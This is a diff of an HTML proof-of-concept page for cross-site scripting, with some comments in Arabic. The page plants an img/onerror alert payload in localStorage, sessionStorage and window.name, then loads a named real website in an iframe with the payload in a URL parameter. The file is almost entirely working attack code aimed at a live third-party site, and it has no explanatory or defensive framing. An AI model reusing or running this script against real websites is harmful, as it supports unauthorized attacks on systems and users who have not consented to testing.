@@ -1,33 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Unified XSS PoC</title>
-</head>
-<body>
-  <h2>⏳ Preparing XSS Payload...</h2>
+  <title>XSS PoC - Auto Inject</title>
   <script>
-    const payload = `<img src=x onerror=alert('🔥 Remote XSS Executed!')>`;
+    const payload = `<img src=x onerror=alert('🔥 Remote XSS Executed')>`;
 
-    // Inject into localStorage
+    // 1. تخزين الحمولة
     localStorage.setItem("xss_payload", payload);
-    localStorage.setItem("xss_test", payload);
-
-    // Inject into sessionStorage
     sessionStorage.setItem("xss_payload", payload);
-    sessionStorage.setItem("xss_test", payload);
-
-    // Inject into window.name
     window.name = payload;
 
-    // Optional: display what we're doing
-    console.log("📦 Payload written to:");
-    console.log("- localStorage");
-    console.log("- sessionStorage");
-    console.log("- window.name");
+    // 2. توليد رابط بارامتر
+    const target = "https://thebrowser.company/";
+    const urlWithParam = `${target}?xss=${encodeURIComponent(payload)}`;
 
-    // Redirect to target site
-    location.href = "https://thebrowser.company/";
+    // 3. تحميل الصفحة الهدف داخل iframe
+    setTimeout(() => {
+      const iframe = document.createElement("iframe");
+      iframe.src = urlWithParam;
+      iframe.style = "width:100%;height:90vh;border:2px solid red;";
+      document.body.appendChild(iframe);
+    }, 1000);
+
+    // 4. رسالة توضيحية
+    window.onload = () => {
+      document.body.insertAdjacentHTML("afterbegin", `<h2>✅ محاولة تفجير XSS في <code>${target}</code></h2>`);
+    };
   </script>
+</head>
+<body>
 </body>
 </html>
